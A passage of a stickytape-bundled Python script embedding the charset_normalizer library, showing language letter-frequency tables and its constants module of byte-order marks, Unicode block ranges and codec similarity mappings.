"a",\n                "i",\n                "e",\n                "o",\n                "n",\n                "\xd1\x86",\n                "\xd1\x88",\n            ],\n        ),\n        (\n            "Lithuanian",\n            [\n                "i",\n                "a",\n                "s",\n                "o",\n                "r",\n                "e",\n                "t",\n                "n",\n                "u",\n                "k",\n                "m",\n                "l",\n                "p",\n                "v",\n                "d",\n                "j",\n                "g",\n                "\xc4\x97",\n                "b",\n                "y",\n                "\xc5\xb3",\n                "\xc5\xa1",\n                "\xc5\xbe",\n                "c",\n                "\xc4\x85",\n                "\xc4\xaf",\n            ],\n        ),\n        (\n            "Slovene",\n            [\n                "e",\n                "a",\n                "i",\n                "o",\n                "n",\n                "r",\n                "s",\n                "l",\n                "t",\n                "j",\n                "v",\n                "k",\n                "d",\n                "p",\n                "m",\n                "u",\n                "z",\n                "b",\n                "g",\n                "h",\n                "\xc4\x8d",\n                "c",\n                "\xc5\xa1",\n                "\xc5\xbe",\n                "f",\n                "y",\n            ],\n        ),\n        (\n            "Slovak",\n            [\n                "o",\n                "a",\n                "e",\n                "n",\n                "i",\n                "r",\n                "v",\n                "t",\n                "s",\n                "l",\n                "k",\n                "d",\n                "m",\n                "p",\n                "u",\n                "c",\n                "h",\n                "j",\n                "b",\n                "z",\n                "\xc3\xa1",\n                "y",\n                "\xc3\xbd",\n                "\xc3\xad",\n                "\xc4\x8d",\n                "\xc3\xa9",\n            ],\n        ),\n        (\n            "Hebrew",\n            [\n                "\xd7\x99",\n                "\xd7\x95",\n                "\xd7\x94",\n                "\xd7\x9c",\n                "\xd7\xa8",\n                "\xd7\x91",\n                "\xd7\xaa",\n                "\xd7\x9e",\n                "\xd7\x90",\n                "\xd7\xa9",\n                "\xd7\xa0",\n                "\xd7\xa2",\n                "\xd7\x9d",\n                "\xd7\x93",\n                "\xd7\xa7",\n                "\xd7\x97",\n                "\xd7\xa4",\n                "\xd7\xa1",\n                "\xd7\x9b",\n                "\xd7\x92",\n                "\xd7\x98",\n                "\xd7\xa6",\n                "\xd7\x9f",\n                "\xd7\x96",\n                "\xd7\x9a",\n            ],\n        ),\n        (\n            "Bulgarian",\n            [\n                "\xd0\xb0",\n                "\xd0\xb8",\n                "\xd0\xbe",\n                "\xd0\xb5",\n                "\xd0\xbd",\n                "\xd1\x82",\n                "\xd1\x80",\n                "\xd1\x81",\n                "\xd0\xb2",\n                "\xd0\xbb",\n                "\xd0\xba",\n                "\xd0\xb4",\n                "\xd0\xbf",\n                "\xd0\xbc",\n                "\xd0\xb7",\n                "\xd0\xb3",\n                "\xd1\x8f",\n                "\xd1\x8a",\n                "\xd1\x83",\n                "\xd0\xb1",\n                "\xd1\x87",\n                "\xd1\x86",\n                "\xd0\xb9",\n                "\xd0\xb6",\n                "\xd1\x89",\n                "\xd1\x85",\n            ],\n        ),\n        (\n            "Croatian",\n            [\n                "a",\n                "i",\n                "o",\n                "e",\n                "n",\n                "r",\n                "j",\n                "s",\n                "t",\n                "u",\n                "k",\n                "l",\n                "v",\n                "d",\n                "m",\n                "p",\n                "g",\n                "z",\n                "b",\n                "c",\n                "\xc4\x8d",\n                "h",\n                "\xc5\xa1",\n                "\xc5\xbe",\n                "\xc4\x87",\n                "f",\n            ],\n        ),\n        (\n            "Hindi",\n            [\n                "\xe0\xa4\x95",\n                "\xe0\xa4\xb0",\n                "\xe0\xa4\xb8",\n                "\xe0\xa4\xa8",\n                "\xe0\xa4\xa4",\n                "\xe0\xa4\xae",\n                "\xe0\xa4\xb9",\n                "\xe0\xa4\xaa",\n                "\xe0\xa4\xaf",\n                "\xe0\xa4\xb2",\n                "\xe0\xa4\xb5",\n                "\xe0\xa4\x9c",\n                "\xe0\xa4\xa6",\n                "\xe0\xa4\x97",\n                "\xe0\xa4\xac",\n                "\xe0\xa4\xb6",\n                "\xe0\xa4\x9f",\n                "\xe0\xa4\x85",\n                "\xe0\xa4\x8f",\n                "\xe0\xa4\xa5",\n                "\xe0\xa4\xad",\n                "\xe0\xa4\xa1",\n                "\xe0\xa4\x9a",\n                "\xe0\xa4\xa7",\n                "\xe0\xa4\xb7",\n                "\xe0\xa4\x87",\n            ],\n        ),\n        (\n            "Estonian",\n            [\n                "a",\n                "i",\n                "e",\n                "s",\n                "t",\n                "l",\n                "u",\n                "n",\n                "o",\n                "k",\n                "r",\n                "d",\n                "m",\n                "v",\n                "g",\n                "p",\n                "j",\n                "h",\n                "\xc3\xa4",\n                "b",\n                "\xc3\xb5",\n                "\xc3\xbc",\n                "f",\n                "c",\n                "\xc3\xb6",\n                "y",\n            ],\n        ),\n        (\n            "Simple English",\n            [\n                "e",\n                "a",\n                "t",\n                "i",\n                "o",\n                "n",\n                "s",\n                "r",\n                "h",\n                "l",\n                "d",\n                "c",\n                "m",\n                "u",\n                "f",\n                "p",\n                "g",\n                "w",\n                "b",\n                "y",\n                "v",\n                "k",\n                "j",\n                "x",\n                "z",\n                "q",\n            ],\n        ),\n        (\n            "Thai",\n            [\n                "\xe0\xb8\xb2",\n                "\xe0\xb8\x99",\n                "\xe0\xb8\xa3",\n                "\xe0\xb8\xad",\n                "\xe0\xb8\x81",\n                "\xe0\xb9\x80",\n                "\xe0\xb8\x87",\n                "\xe0\xb8\xa1",\n                "\xe0\xb8\xa2",\n                "\xe0\xb8\xa5",\n                "\xe0\xb8\xa7",\n                "\xe0\xb8\x94",\n                "\xe0\xb8\x97",\n                "\xe0\xb8\xaa",\n                "\xe0\xb8\x95",\n                "\xe0\xb8\xb0",\n                "\xe0\xb8\x9b",\n                "\xe0\xb8\x9a",\n                "\xe0\xb8\x84",\n                "\xe0\xb8\xab",\n                "\xe0\xb9\x81",\n                "\xe0\xb8\x88",\n                "\xe0\xb8\x9e",\n                "\xe0\xb8\x8a",\n                "\xe0\xb8\x82",\n                "\xe0\xb9\x83",\n            ],\n        ),\n        (\n            "Greek",\n            [\n                "\xce\xb1",\n                "\xcf\x84",\n                "\xce\xbf",\n                "\xce\xb9",\n                "\xce\xb5",\n                "\xce\xbd",\n                "\xcf\x81",\n                "\xcf\x83",\n                "\xce\xba",\n                "\xce\xb7",\n                "\xcf\x80",\n                "\xcf\x82",\n                "\xcf\x85",\n                "\xce\xbc",\n                "\xce\xbb",\n                "\xce\xaf",\n                "\xcf\x8c",\n                "\xce\xac",\n                "\xce\xb3",\n                "\xce\xad",\n                "\xce\xb4",\n                "\xce\xae",\n                "\xcf\x89",\n                "\xcf\x87",\n                "\xce\xb8",\n                "\xcf\x8d",\n            ],\n        ),\n        (\n            "Tamil",\n            [\n                "\xe0\xae\x95",\n                "\xe0\xae\xa4",\n                "\xe0\xae\xaa",\n                "\xe0\xae\x9f",\n                "\xe0\xae\xb0",\n                "\xe0\xae\xae",\n                "\xe0\xae\xb2",\n                "\xe0\xae\xa9",\n                "\xe0\xae\xb5",\n                "\xe0\xae\xb1",\n                "\xe0\xae\xaf",\n                "\xe0\xae\xb3",\n                "\xe0\xae\x9a",\n                "\xe0\xae\xa8",\n                "\xe0\xae\x87",\n                "\xe0\xae\xa3",\n                "\xe0\xae\x85",\n                "\xe0\xae\x86",\n                "\xe0\xae\xb4",\n                "\xe0\xae\x99",\n                "\xe0\xae\x8e",\n                "\xe0\xae\x89",\n                "\xe0\xae\x92",\n                "\xe0\xae\xb8",\n            ],\n        ),\n        (\n            "Classical Chinese",\n            [\n                "\xe4\xb9\x8b",\n                "\xe5\xb9\xb4",\n                "\xe7\x82\xba",\n                "\xe4\xb9\x9f",\n                "\xe4\xbb\xa5",\n                "\xe4\xb8\x80",\n                "\xe4\xba\xba",\n                "\xe5\x85\xb6",\n                "\xe8\x80\x85",\n                "\xe5\x9c\x8b",\n                "\xe6\x9c\x89",\n                "\xe4\xba\x8c",\n                "\xe5\x8d\x81",\n                "\xe6\x96\xbc",\n                "\xe6\x9b\xb0",\n                "\xe4\xb8\x89",\n                "\xe4\xb8\x8d",\n                "\xe5\xa4\xa7",\n                "\xe8\x80\x8c",\n                "\xe5\xad\x90",\n                "\xe4\xb8\xad",\n                "\xe4\xba\x94",\n                "\xe5\x9b\x9b",\n            ],\n        ),\n        (\n            "Kazakh",\n            [\n                "\xd0\xb0",\n                "\xd1\x8b",\n                "\xd0\xb5",\n                "\xd0\xbd",\n                "\xd1\x82",\n                "\xd1\x80",\n                "\xd0\xbb",\n                "\xd1\x96",\n                "\xd0\xb4",\n                "\xd1\x81",\n                "\xd0\xbc",\n                "\xd2\x9b",\n                "\xd0\xba",\n                "\xd0\xbe",\n                "\xd0\xb1",\n                "\xd0\xb8",\n                "\xd1\x83",\n                "\xd2\x93",\n                "\xd0\xb6",\n                "\xd2\xa3",\n                "\xd0\xb7",\n                "\xd1\x88",\n                "\xd0\xb9",\n                "\xd0\xbf",\n                "\xd0\xb3",\n                "\xd3\xa9",\n            ],\n        ),\n    ]\n)\n')
    __stickytape_write_module('charset_normalizer/constant.py', b'from codecs import BOM_UTF8, BOM_UTF16_BE, BOM_UTF16_LE, BOM_UTF32_BE, BOM_UTF32_LE\nfrom collections import OrderedDict\nfrom encodings.aliases import aliases\nfrom re import IGNORECASE, compile as re_compile\nfrom typing import Dict, List, Set, Union\n\nfrom .assets import FREQUENCIES\n\n# Contain for each eligible encoding a list of/item bytes SIG/BOM\nENCODING_MARKS = OrderedDict(\n    [\n        ("utf_8", BOM_UTF8),\n        (\n            "utf_7",\n            [\n                b"\\x2b\\x2f\\x76\\x38",\n                b"\\x2b\\x2f\\x76\\x39",\n                b"\\x2b\\x2f\\x76\\x2b",\n                b"\\x2b\\x2f\\x76\\x2f",\n                b"\\x2b\\x2f\\x76\\x38\\x2d",\n            ],\n        ),\n        ("gb18030", b"\\x84\\x31\\x95\\x33"),\n        ("utf_32", [BOM_UTF32_BE, BOM_UTF32_LE]),\n        ("utf_16", [BOM_UTF16_BE, BOM_UTF16_LE]),\n    ]\n)  # type: Dict[str, Union[bytes, List[bytes]]]\n\nTOO_SMALL_SEQUENCE = 32  # type: int\nTOO_BIG_SEQUENCE = int(10e6)  # type: int\n\nUTF8_MAXIMAL_ALLOCATION = 1112064  # type: int\n\nUNICODE_RANGES_COMBINED = {\n    "Control character": range(31 + 1),\n    "Basic Latin": range(32, 127 + 1),\n    "Latin-1 Supplement": range(128, 255 + 1),\n    "Latin Extended-A": range(256, 383 + 1),\n    "Latin Extended-B": range(384, 591 + 1),\n    "IPA Extensions": range(592, 687 + 1),\n    "Spacing Modifier Letters": range(688, 767 + 1),\n    "Combining Diacritical Marks": range(768, 879 + 1),\n    "Greek and Coptic": range(880, 1023 + 1),\n    "Cyrillic": range(1024, 1279 + 1),\n    "Cyrillic Supplement": range(1280, 1327 + 1),\n    "Armenian": range(1328, 1423 + 1),\n    "Hebrew": range(1424, 1535 + 1),\n    "Arabic": range(1536, 1791 + 1),\n    "Syriac": range(1792, 1871 + 1),\n    "Arabic Supplement": range(1872, 1919 + 1),\n    "Thaana": range(1920, 1983 + 1),\n    "NKo": range(1984, 2047 + 1),\n    "Samaritan": range(2048, 2111 + 1),\n    "Mandaic": range(2112, 2143 + 1),\n    "Syriac Supplement": range(2144, 2159 + 1),\n    "Arabic Extended-A": range(2208, 2303 + 1),\n    "Devanagari": range(2304, 2431 + 1),\n    "Bengali": range(2432, 2559 + 1),\n    "Gurmukhi": range(2560, 2687 + 1),\n    "Gujarati": range(2688, 2815 + 1),\n    "Oriya": range(2816, 2943 + 1),\n    "Tamil": range(2944, 3071 + 1),\n    "Telugu": range(3072, 3199 + 1),\n    "Kannada": range(3200, 3327 + 1),\n    "Malayalam": range(3328, 3455 + 1),\n    "Sinhala": range(3456, 3583 + 1),\n    "Thai": range(3584, 3711 + 1),\n    "Lao": range(3712, 3839 + 1),\n    "Tibetan": range(3840, 4095 + 1),\n    "Myanmar": range(4096, 4255 + 1),\n    "Georgian": range(4256, 4351 + 1),\n    "Hangul Jamo": range(4352, 4607 + 1),\n    "Ethiopic": range(4608, 4991 + 1),\n    "Ethiopic Supplement": range(4992, 5023 + 1),\n    "Cherokee": range(5024, 5119 + 1),\n    "Unified Canadian Aboriginal Syllabics": range(5120, 5759 + 1),\n    "Ogham": range(5760, 5791 + 1),\n    "Runic": range(5792, 5887 + 1),\n    "Tagalog": range(5888, 5919 + 1),\n    "Hanunoo": range(5920, 5951 + 1),\n    "Buhid": range(5952, 5983 + 1),\n    "Tagbanwa": range(5984, 6015 + 1),\n    "Khmer": range(6016, 6143 + 1),\n    "Mongolian": range(6144, 6319 + 1),\n    "Unified Canadian Aboriginal Syllabics Extended": range(6320, 6399 + 1),\n    "Limbu": range(6400, 6479 + 1),\n    "Tai Le": range(6480, 6527 + 1),\n    "New Tai Lue": range(6528, 6623 + 1),\n    "Khmer Symbols": range(6624, 6655 + 1),\n    "Buginese": range(6656, 6687 + 1),\n    "Tai Tham": range(6688, 6831 + 1),\n    "Combining Diacritical Marks Extended": range(6832, 6911 + 1),\n    "Balinese": range(6912, 7039 + 1),\n    "Sundanese": range(7040, 7103 + 1),\n    "Batak": range(7104, 7167 + 1),\n    "Lepcha": range(7168, 7247 + 1),\n    "Ol Chiki": range(7248, 7295 + 1),\n    "Cyrillic Extended C": range(7296, 7311 + 1),\n    "Sundanese Supplement": range(7360, 7375 + 1),\n    "Vedic Extensions": range(7376, 7423 + 1),\n    "Phonetic Extensions": range(7424, 7551 + 1),\n    "Phonetic Extensions Supplement": range(7552, 7615 + 1),\n    "Combining Diacritical Marks Supplement": range(7616, 7679 + 1),\n    "Latin Extended Additional": range(7680, 7935 + 1),\n    "Greek Extended": range(7936, 8191 + 1),\n    "General Punctuation": range(8192, 8303 + 1),\n    "Superscripts and Subscripts": range(8304, 8351 + 1),\n    "Currency Symbols": range(8352, 8399 + 1),\n    "Combining Diacritical Marks for Symbols": range(8400, 8447 + 1),\n    "Letterlike Symbols": range(8448, 8527 + 1),\n    "Number Forms": range(8528, 8591 + 1),\n    "Arrows": range(8592, 8703 + 1),\n    "Mathematical Operators": range(8704, 8959 + 1),\n    "Miscellaneous Technical": range(8960, 9215 + 1),\n    "Control Pictures": range(9216, 9279 + 1),\n    "Optical Character Recognition": range(9280, 9311 + 1),\n    "Enclosed Alphanumerics": range(9312, 9471 + 1),\n    "Box Drawing": range(9472, 9599 + 1),\n    "Block Elements": range(9600, 9631 + 1),\n    "Geometric Shapes": range(9632, 9727 + 1),\n    "Miscellaneous Symbols": range(9728, 9983 + 1),\n    "Dingbats": range(9984, 10175 + 1),\n    "Miscellaneous Mathematical Symbols-A": range(10176, 10223 + 1),\n    "Supplemental Arrows-A": range(10224, 10239 + 1),\n    "Braille Patterns": range(10240, 10495 + 1),\n    "Supplemental Arrows-B": range(10496, 10623 + 1),\n    "Miscellaneous Mathematical Symbols-B": range(10624, 10751 + 1),\n    "Supplemental Mathematical Operators": range(10752, 11007 + 1),\n    "Miscellaneous Symbols and Arrows": range(11008, 11263 + 1),\n    "Glagolitic": range(11264, 11359 + 1),\n    "Latin Extended-C": range(11360, 11391 + 1),\n    "Coptic": range(11392, 11519 + 1),\n    "Georgian Supplement": range(11520, 11567 + 1),\n    "Tifinagh": range(11568, 11647 + 1),\n    "Ethiopic Extended": range(11648, 11743 + 1),\n    "Cyrillic Extended-A": range(11744, 11775 + 1),\n    "Supplemental Punctuation": range(11776, 11903 + 1),\n    "CJK Radicals Supplement": range(11904, 12031 + 1),\n    "Kangxi Radicals": range(12032, 12255 + 1),\n    "Ideographic Description Characters": range(12272, 12287 + 1),\n    "CJK Symbols and Punctuation": range(12288, 12351 + 1),\n    "Hiragana": range(12352, 12447 + 1),\n    "Katakana": range(12448, 12543 + 1),\n    "Bopomofo": range(12544, 12591 + 1),\n    "Hangul Compatibility Jamo": range(12592, 12687 + 1),\n    "Kanbun": range(12688, 12703 + 1),\n    "Bopomofo Extended": range(12704, 12735 + 1),\n    "CJK Strokes": range(12736, 12783 + 1),\n    "Katakana Phonetic Extensions": range(12784, 12799 + 1),\n    "Enclosed CJK Letters and Months": range(12800, 13055 + 1),\n    "CJK Compatibility": range(13056, 13311 + 1),\n    "CJK Unified Ideographs Extension A": range(13312, 19903 + 1),\n    "Yijing Hexagram Symbols": range(19904, 19967 + 1),\n    "CJK Unified Ideographs": range(19968, 40959 + 1),\n    "Yi Syllables": range(40960, 42127 + 1),\n    "Yi Radicals": range(42128, 42191 + 1),\n    "Lisu": range(42192, 42239 + 1),\n    "Vai": range(42240, 42559 + 1),\n    "Cyrillic Extended-B": range(42560, 42655 + 1),\n    "Bamum": range(42656, 42751 + 1),\n    "Modifier Tone Letters": range(42752, 42783 + 1),\n    "Latin Extended-D": range(42784, 43007 + 1),\n    "Syloti Nagri": range(43008, 43055 + 1),\n    "Common Indic Number Forms": range(43056, 43071 + 1),\n    "Phags-pa": range(43072, 43135 + 1),\n    "Saurashtra": range(43136, 43231 + 1),\n    "Devanagari Extended": range(43232, 43263 + 1),\n    "Kayah Li": range(43264, 43311 + 1),\n    "Rejang": range(43312, 43359 + 1),\n    "Hangul Jamo Extended-A": range(43360, 43391 + 1),\n    "Javanese": range(43392, 43487 + 1),\n    "Myanmar Extended-B": range(43488, 43519 + 1),\n    "Cham": range(43520, 43615 + 1),\n    "Myanmar Extended-A": range(43616, 43647 + 1),\n    "Tai Viet": range(43648, 43743 + 1),\n    "Meetei Mayek Extensions": range(43744, 43775 + 1),\n    "Ethiopic Extended-A": range(43776, 43823 + 1),\n    "Latin Extended-E": range(43824, 43887 + 1),\n    "Cherokee Supplement": range(43888, 43967 + 1),\n    "Meetei Mayek": range(43968, 44031 + 1),\n    "Hangul Syllables": range(44032, 55215 + 1),\n    "Hangul Jamo Extended-B": range(55216, 55295 + 1),\n    "High Surrogates": range(55296, 56191 + 1),\n    "High Private Use Surrogates": range(56192, 56319 + 1),\n    "Low Surrogates": range(56320, 57343 + 1),\n    "Private Use Area": range(57344, 63743 + 1),\n    "CJK Compatibility Ideographs": range(63744, 64255 + 1),\n    "Alphabetic Presentation Forms": range(64256, 64335 + 1),\n    "Arabic Presentation Forms-A": range(64336, 65023 + 1),\n    "Variation Selectors": range(65024, 65039 + 1),\n    "Vertical Forms": range(65040, 65055 + 1),\n    "Combining Half Marks": range(65056, 65071 + 1),\n    "CJK Compatibility Forms": range(65072, 65103 + 1),\n    "Small Form Variants": range(65104, 65135 + 1),\n    "Arabic Presentation Forms-B": range(65136, 65279 + 1),\n    "Halfwidth and Fullwidth Forms": range(65280, 65519 + 1),\n    "Specials": range(65520, 65535 + 1),\n    "Linear B Syllabary": range(65536, 65663 + 1),\n    "Linear B Ideograms": range(65664, 65791 + 1),\n    "Aegean Numbers": range(65792, 65855 + 1),\n    "Ancient Greek Numbers": range(65856, 65935 + 1),\n    "Ancient Symbols": range(65936, 65999 + 1),\n    "Phaistos Disc": range(66000, 66047 + 1),\n    "Lycian": range(66176, 66207 + 1),\n    "Carian": range(66208, 66271 + 1),\n    "Coptic Epact Numbers": range(66272, 66303 + 1),\n    "Old Italic": range(66304, 66351 + 1),\n    "Gothic": range(66352, 66383 + 1),\n    "Old Permic": range(66384, 66431 + 1),\n    "Ugaritic": range(66432, 66463 + 1),\n    "Old Persian": range(66464, 66527 + 1),\n    "Deseret": range(66560, 66639 + 1),\n    "Shavian": range(66640, 66687 + 1),\n    "Osmanya": range(66688, 66735 + 1),\n    "Osage": range(66736, 66815 + 1),\n    "Elbasan": range(66816, 66863 + 1),\n    "Caucasian Albanian": range(66864, 66927 + 1),\n    "Linear A": range(67072, 67455 + 1),\n    "Cypriot Syllabary": range(67584, 67647 + 1),\n    "Imperial Aramaic": range(67648, 67679 + 1),\n    "Palmyrene": range(67680, 67711 + 1),\n    "Nabataean": range(67712, 67759 + 1),\n    "Hatran": range(67808, 67839 + 1),\n    "Phoenician": range(67840, 67871 + 1),\n    "Lydian": range(67872, 67903 + 1),\n    "Meroitic Hieroglyphs": range(67968, 67999 + 1),\n    "Meroitic Cursive": range(68000, 68095 + 1),\n    "Kharoshthi": range(68096, 68191 + 1),\n    "Old South Arabian": range(68192, 68223 + 1),\n    "Old North Arabian": range(68224, 68255 + 1),\n    "Manichaean": range(68288, 68351 + 1),\n    "Avestan": range(68352, 68415 + 1),\n    "Inscriptional Parthian": range(68416, 68447 + 1),\n    "Inscriptional Pahlavi": range(68448, 68479 + 1),\n    "Psalter Pahlavi": range(68480, 68527 + 1),\n    "Old Turkic": range(68608, 68687 + 1),\n    "Old Hungarian": range(68736, 68863 + 1),\n    "Rumi Numeral Symbols": range(69216, 69247 + 1),\n    "Brahmi": range(69632, 69759 + 1),\n    "Kaithi": range(69760, 69839 + 1),\n    "Sora Sompeng": range(69840, 69887 + 1),\n    "Chakma": range(69888, 69967 + 1),\n    "Mahajani": range(69968, 70015 + 1),\n    "Sharada": range(70016, 70111 + 1),\n    "Sinhala Archaic Numbers": range(70112, 70143 + 1),\n    "Khojki": range(70144, 70223 + 1),\n    "Multani": range(70272, 70319 + 1),\n    "Khudawadi": range(70320, 70399 + 1),\n    "Grantha": range(70400, 70527 + 1),\n    "Newa": range(70656, 70783 + 1),\n    "Tirhuta": range(70784, 70879 + 1),\n    "Siddham": range(71040, 71167 + 1),\n    "Modi": range(71168, 71263 + 1),\n    "Mongolian Supplement": range(71264, 71295 + 1),\n    "Takri": range(71296, 71375 + 1),\n    "Ahom": range(71424, 71487 + 1),\n    "Warang Citi": range(71840, 71935 + 1),\n    "Zanabazar Square": range(72192, 72271 + 1),\n    "Soyombo": range(72272, 72367 + 1),\n    "Pau Cin Hau": range(72384, 72447 + 1),\n    "Bhaiksuki": range(72704, 72815 + 1),\n    "Marchen": range(72816, 72895 + 1),\n    "Masaram Gondi": range(72960, 73055 + 1),\n    "Cuneiform": range(73728, 74751 + 1),\n    "Cuneiform Numbers and Punctuation": range(74752, 74879 + 1),\n    "Early Dynastic Cuneiform": range(74880, 75087 + 1),\n    "Egyptian Hieroglyphs": range(77824, 78895 + 1),\n    "Anatolian Hieroglyphs": range(82944, 83583 + 1),\n    "Bamum Supplement": range(92160, 92735 + 1),\n    "Mro": range(92736, 92783 + 1),\n    "Bassa Vah": range(92880, 92927 + 1),\n    "Pahawh Hmong": range(92928, 93071 + 1),\n    "Miao": range(93952, 94111 + 1),\n    "Ideographic Symbols and Punctuation": range(94176, 94207 + 1),\n    "Tangut": range(94208, 100351 + 1),\n    "Tangut Components": range(100352, 101119 + 1),\n    "Kana Supplement": range(110592, 110847 + 1),\n    "Kana Extended-A": range(110848, 110895 + 1),\n    "Nushu": range(110960, 111359 + 1),\n    "Duployan": range(113664, 113823 + 1),\n    "Shorthand Format Controls": range(113824, 113839 + 1),\n    "Byzantine Musical Symbols": range(118784, 119039 + 1),\n    "Musical Symbols": range(119040, 119295 + 1),\n    "Ancient Greek Musical Notation": range(119296, 119375 + 1),\n    "Tai Xuan Jing Symbols": range(119552, 119647 + 1),\n    "Counting Rod Numerals": range(119648, 119679 + 1),\n    "Mathematical Alphanumeric Symbols": range(119808, 120831 + 1),\n    "Sutton SignWriting": range(120832, 121519 + 1),\n    "Glagolitic Supplement": range(122880, 122927 + 1),\n    "Mende Kikakui": range(124928, 125151 + 1),\n    "Adlam": range(125184, 125279 + 1),\n    "Arabic Mathematical Alphabetic Symbols": range(126464, 126719 + 1),\n    "Mahjong Tiles": range(126976, 127023 + 1),\n    "Domino Tiles": range(127024, 127135 + 1),\n    "Playing Cards": range(127136, 127231 + 1),\n    "Enclosed Alphanumeric Supplement": range(127232, 127487 + 1),\n    "Enclosed Ideographic Supplement": range(127488, 127743 + 1),\n    "Miscellaneous Symbols and Pictographs": range(127744, 128511 + 1),\n    "Emoticons range(Emoji)": range(128512, 128591 + 1),\n    "Ornamental Dingbats": range(128592, 128639 + 1),\n    "Transport and Map Symbols": range(128640, 128767 + 1),\n    "Alchemical Symbols": range(128768, 128895 + 1),\n    "Geometric Shapes Extended": range(128896, 129023 + 1),\n    "Supplemental Arrows-C": range(129024, 129279 + 1),\n    "Supplemental Symbols and Pictographs": range(129280, 129535 + 1),\n    "CJK Unified Ideographs Extension B": range(131072, 173791 + 1),\n    "CJK Unified Ideographs Extension C": range(173824, 177983 + 1),\n    "CJK Unified Ideographs Extension D": range(177984, 178207 + 1),\n    "CJK Unified Ideographs Extension E": range(178208, 183983 + 1),\n    "CJK Unified Ideographs Extension F": range(183984, 191471 + 1),\n    "CJK Compatibility Ideographs Supplement": range(194560, 195103 + 1),\n    "Tags": range(917504, 917631 + 1),\n    "Variation Selectors Supplement": range(917760, 917999 + 1),\n}  # type: Dict[str, range]\n\n\nUNICODE_SECONDARY_RANGE_KEYWORD = [\n    "Supplement",\n    "Extended",\n    "Extensions",\n    "Modifier",\n    "Marks",\n    "Punctuation",\n    "Symbols",\n    "Forms",\n    "Operators",\n    "Miscellaneous",\n    "Drawing",\n    "Block",\n    "Shapes",\n    "Supplemental",\n    "Tags",\n]  # type: List[str]\n\nRE_POSSIBLE_ENCODING_INDICATION = re_compile(\n    r"(?:(?:encoding)|(?:charset)|(?:coding))(?:[\\:= ]{1,10})(?:[\\"\\\']?)([a-zA-Z0-9\\-_]+)(?:[\\"\\\']?)",\n    IGNORECASE,\n)\n\nIANA_SUPPORTED = sorted(\n    filter(\n        lambda x: x.endswith("_codec") is False\n        and x not in {"rot_13", "tactis", "mbcs"},\n        list(set(aliases.values())),\n    )\n)  # type: List[str]\n\nIANA_SUPPORTED_COUNT = len(IANA_SUPPORTED)  # type: int\n\n# pre-computed code page that are similar using the function cp_similarity.\nIANA_SUPPORTED_SIMILAR = {\n    "cp037": ["cp1026", "cp1140", "cp273", "cp500"],\n    "cp1026": ["cp037", "cp1140", "cp273", "cp500"],\n    "cp1125": ["cp866"],\n    "cp1140": ["cp037", "cp1026", "cp273", "cp500"],\n    "cp1250": ["iso8859_2"],\n    "cp1251": ["kz1048", "ptcp154"],\n    "cp1252": ["iso8859_15", "iso8859_9", "latin_1"],\n    "cp1253": ["iso8859_7"],\n    "cp1254": ["iso8859_15", "iso8859_9", "latin_1"],\n    "cp1257": ["iso8859_13"],\n    "cp273": ["cp037", "cp1026", "cp1140", "cp500"],\n    "cp437": ["cp850", "cp858", "cp860", "cp861", "cp862", "cp863", "cp865"],\n    "cp500": ["cp037", "cp1026", "cp1140", "cp273"],\n    "cp850": ["cp437", "cp857", "cp858", "cp865"],\n    "cp857": ["cp850", "cp858", "cp865"],\n    "cp858": ["cp437", "cp850", "cp857", "cp865"],\n    "cp860": ["cp437", "cp861", "cp862", "cp863", "cp865"],\n    "cp861": ["cp437", "cp860", "cp862", "cp863", "cp865"],\n    "cp862": ["cp437", "cp860", "cp861", "cp863", "cp865"],\n    "cp863": ["cp437", "cp860", "cp861", "cp862", "cp865"],\n    "cp865": ["cp437", "cp850", "cp857", "cp858", "cp860", "cp861", "cp862", "cp863"],\n    "cp866": ["cp1125"],\n    "iso8859_10": ["iso8859_14", "iso8859_15", "iso8859_4", "iso8859_9", "latin_1"],\n    "iso8859_11": ["tis_620"],\n    "iso8859_13": ["cp1257"],\n    "iso8859_14": [\n        "iso8859_10",\n        "iso8859_15",\n        "iso8859_16",\n        "iso8859_3",\n        "iso8859_9",\n        "latin_1",\n    ],\n    "iso8859_15": [\n        "cp1252",\n        "cp1254",\n        "iso8859_10",\n        "iso8859_14",\n        "iso8859_16",\n        "iso8859_3",\n        "iso8859_9",\n        "latin_1",\n    ],\n    "iso8859_16": [\n        "iso8859_14",\n        "iso8859_15",\n        "iso8859_2",\n        "iso8859_3",\n        "iso8859_9",\n        "latin_1",\n    ],\n    "iso8859_2": ["cp1250", "iso8859_16", "iso8859_4"],\n    "iso8859_3": ["iso8859_14", "iso8859_15", "iso8859_16", "iso8859_9", "latin_1"],\n    "iso8859_4": ["iso8859_10", "iso8859_2", "iso8859_9", "latin_1"],\n    "iso8859_7": ["cp1253"],\n    "iso8859_9": [\n        "cp1252",\n        "cp1254",\n        "cp1258",\n        "iso8859_10",\n        "iso8859_14",\n        "iso8859_15",\n        "iso8859_16",\n        "iso8859_3",\n        "iso8859_4",\n        "latin_1",\n    ],\n    "kz1048": ["cp1251", "ptcp154"],\n    "latin_1": [\n        "cp1252",\n        "cp1254",\n        "cp1258",\n        "iso8859_10",\n        "iso8859_14",\n        "iso8859_15",\n        "iso8859_16",\n        "iso8859_3",\n        "iso8859_4",\n        "iso8859_9",\n    ],\n    "mac_iceland": ["mac_roman", "mac_turkish"],\n    "mac_roman": ["mac_iceland", "mac_turkish"],\n    "mac_turkish": ["mac_iceland", "mac_roman"],\n    "ptcp154": ["cp1251", "kz1048"],\n    "tis_620": ["iso8859_11"],\n}  # type: Dict[str, List[str]]\n\n\nCHARDET_CORRESPONDENCE = {\n    "iso2022_kr": "ISO-2022-KR",\n    "iso2022_jp": "ISO-2022-JP",\n    "euc_kr": "EUC-KR",\n    "tis_620": "TIS-620",\n    "utf_32": "UTF-32",\n    "euc_jp": "EUC-JP",\n    "koi8_r": "KOI8-R",\n    "iso8859_1": "ISO-8859-1",\n    "iso8859_2": "ISO-8859-2",\n    "iso8859_5": "ISO-8859-5",\n    "iso8859_6": "ISO-8859-6",\n    "iso8859_7": "ISO-8859-7",\n    "iso8859_8": "ISO-8859-8",\n    "utf_16": "UTF-16",\n    "cp855": "IBM855",\n    "mac_cyrillic": "MacCyrillic",\n    "gb2312": "GB2312",\n    "gb18030": "GB18030",\n    "cp932": "CP932",\n    "cp866": "IBM866",\n    "utf_8": "utf-8",\n    "utf_8_sig": "UTF-8-SIG",\n    "shift_jis": "SHIFT_JIS",\n    "big5": "Big5",\n    "cp1250": "windows-1250",\n    "cp1251": "windows-1251",\n    "cp1252": "Windows-1252",\n    "cp1253": "windows-1253",\n    "cp1255": "windows-1255",\n    "cp1256": "windows-1256",\n    "cp1254": "Windows-1254",\n    "cp949": "CP949",\n}  